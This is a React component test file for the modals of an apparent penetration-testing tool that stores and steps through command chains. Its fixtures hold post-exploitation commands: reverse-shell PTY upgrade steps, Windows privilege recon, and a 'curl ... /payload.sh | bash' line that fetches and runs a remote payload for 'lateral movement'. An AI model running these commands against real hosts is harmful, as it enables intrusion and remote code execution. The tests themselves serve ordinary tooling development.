import { describe, it, expect, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import { SnippetChainsModal } from './SnippetChainsModal';
import { SnippetChainRunnerModal } from './SnippetChainRunnerModal';
import { SnippetChain, SnippetContext } from '../types/snippet';

const sampleChains: SnippetChain[] = [
  {
    id: 'chain-linux-test',
    name: 'Linux Stabilization Chain',
    description: 'Upgrade dumb reverse shell to PTY',
    category: 'Stabilization',
    targetOs: 'linux',
    hostId: '',
    stopOnError: true,
    autoRunWithoutPrompt: false,
    tags: ['linux', 'pty'],
    steps: [
      {
        id: 's1',
        title: 'Spawn PTY',
        command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        confirmBeforeRun: true,
        delayMs: 300,
        stopOnError: true,
      },
      {
        id: 's2',
        title: 'Attacker Raw Mode',
        command: 'stty raw -echo; fg',
        confirmBeforeRun: true,
        delayMs: 200,
        stopOnError: true,
      },
    ],
  },
  {
    id: 'chain-win-test',
    name: 'Windows Token Impersonation',
    description: 'Enumerate whoami /all and privileges',
    category: 'Recon',
    targetOs: 'windows',
    hostId: 'host-123',
    stopOnError: false,
    autoRunWithoutPrompt: true, // danger mode
    tags: ['windows'],
    steps: [
      {
        id: 'sw1',
        title: 'User Privileges',
        command: 'whoami /all',
        confirmBeforeRun: false,
        delayMs: 100,
        stopOnError: false,
      },
    ],
  },
];

describe('SnippetChainsModal (F-16)', () => {
  it('renders modal with title, search input, OS filters, and chain cards', () => {
    render(
      <SnippetChainsModal
        chains={sampleChains}
        hosts={[{ id: 'host-123', label: 'WinDC', address: '10.0.0.10' }]}
        activeSessionId="sess-1"
        onSaveChain={vi.fn()}
        onDeleteChain={vi.fn()}
        onRunChain={vi.fn()}
        onClose={vi.fn()}
      />
    );

    expect(screen.getByText(/SNIPPET CHAINS \/\/ MULTI-STAGE SEQUENCES/i)).toBeInTheDocument();
    expect(screen.getByText('Linux Stabilization Chain')).toBeInTheDocument();
    expect(screen.getByText('Windows Token Impersonation')).toBeInTheDocument();
    expect(screen.getByText('NO-PROMPT AUTO')).toBeInTheDocument();
  });

  it('filters chains by OS dropdown', () => {
    render(
      <SnippetChainsModal
        chains={sampleChains}
        onSaveChain={vi.fn()}
        onDeleteChain={vi.fn()}
        onRunChain={vi.fn()}
        onClose={vi.fn()}
      />
    );

    const osSelect = screen.getByRole('combobox');
    fireEvent.change(osSelect, { target: { value: 'windows' } });

    expect(screen.queryByText('Linux Stabilization Chain')).not.toBeInTheDocument();
    expect(screen.getByText('Windows Token Impersonation')).toBeInTheDocument();
  });

  it('allows opening new chain form, adding steps, and shows danger warning on auto-run toggle', async () => {
    const handleSave = vi.fn().mockResolvedValue(undefined);
    render(
      <SnippetChainsModal
        chains={sampleChains}
        onSaveChain={handleSave}
        onDeleteChain={vi.fn()}
        onRunChain={vi.fn()}
        onClose={vi.fn()}
      />
    );

    // Click + New Chain
    fireEvent.click(screen.getByRole('button', { name: /\+ New Chain/i }));

    expect(screen.getByText('CREATE NEW SNIPPET CHAIN')).toBeInTheDocument();

    // Fill in name
    const nameInput = screen.getByPlaceholderText(/e.g. Linux Reverse Shell Stabilization/i);
    fireEvent.change(nameInput, { target: { value: 'Custom Lateral Movement' } });

    // Fill in step 1 command
    const cmdTextarea = screen.getByPlaceholderText(/e.g. sudo -l/i);
    fireEvent.change(cmdTextarea, { target: { value: 'curl http://{{HOST}}:{{PORT=8000}}/payload.sh | bash' } });

    // Toggle auto-run without prompt -> verify dangerous warning is shown
    const autoRunCheckbox = screen.getByRole('checkbox', {
      name: /Automatic Execution Without Prompts \("ohne Nachfrage"\)/i,
    });
    expect(screen.queryByText(/WARNING: Unprompted automated chains/i)).not.toBeInTheDocument();
    fireEvent.click(autoRunCheckbox);
    expect(screen.getByText(/WARNING: Unprompted automated chains/i)).toBeInTheDocument();

    // Click Save Chain
    fireEvent.click(screen.getByRole('button', { name: /Save Chain/i }));

    await waitFor(() => {
      expect(handleSave).toHaveBeenCalledTimes(1);
    });
    const saved = handleSave.mock.calls[0][0] as SnippetChain;
    expect(saved.name).toBe('Custom Lateral Movement');
    expect(saved.autoRunWithoutPrompt).toBe(true);
    expect(saved.steps.length).toBe(1);
  });
});

describe('SnippetChainRunnerModal (F-16)', () => {
  const context: SnippetContext = {
    hostId: 'host-1',
    hostLabel: 'web-srv',
    address: '10.10.10.25',
    username: 'www-data',
    port: 22,
    workingDir: '/var/www',
  };

  it('renders progress bar, preview command with resolved context variables, and executes step', async () => {
    const handleExecuteStep = vi.fn().mockResolvedValue(undefined);
    const handleClose = vi.fn();

    render(
      <SnippetChainRunnerModal
        chain={sampleChains[0]}
        sessionId="sess-target-1"
        hostLabel="web-srv"
        context={context}
        onExecuteStep={handleExecuteStep}
        onClose={handleClose}
      />
    );

    expect(screen.getByText(/CHAIN RUNNER: LINUX STABILIZATION CHAIN/i)).toBeInTheDocument();
    expect(screen.getByText(/STEP 1 OF 2:/i)).toBeInTheDocument();
    expect(screen.getByText("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")).toBeInTheDocument();

    // Click Execute Step 1
    const executeBtn = screen.getByRole('button', { name: /Execute Step 1/i });
    fireEvent.click(executeBtn);

    await waitFor(() => {
      expect(handleExecuteStep).toHaveBeenCalledTimes(1);
    });
    expect(handleExecuteStep).toHaveBeenCalledWith(0, expect.any(Object));

    // Advances to Step 2
    expect(await screen.findByText(/STEP 2 OF 2:/i)).toBeInTheDocument();
    expect(screen.getByText('stty raw -echo; fg')).toBeInTheDocument();
  });

  it('supports skipping steps and advancing to completion', async () => {
    const handleExecuteStep = vi.fn().mockResolvedValue(undefined);
    const handleClose = vi.fn();

    render(
      <SnippetChainRunnerModal
        chain={sampleChains[0]}
        sessionId="sess-target-1"
        context={context}
        onExecuteStep={handleExecuteStep}
        onClose={handleClose}
      />
    );

    // Skip step 1
    fireEvent.click(screen.getByRole('button', { name: /Skip Step/i }));

    // Now on step 2
    expect(await screen.findByText(/STEP 2 OF 2:/i)).toBeInTheDocument();

    // Skip step 2
    fireEvent.click(screen.getByRole('button', { name: /Skip Step/i }));

    // Completion view reached
    expect(await screen.findByText('CHAIN EXECUTION COMPLETE')).toBeInTheDocument();
    expect(screen.getAllByRole('button', { name: /Close Runner/i }).length).toBeGreaterThanOrEqual(1);
  });
});
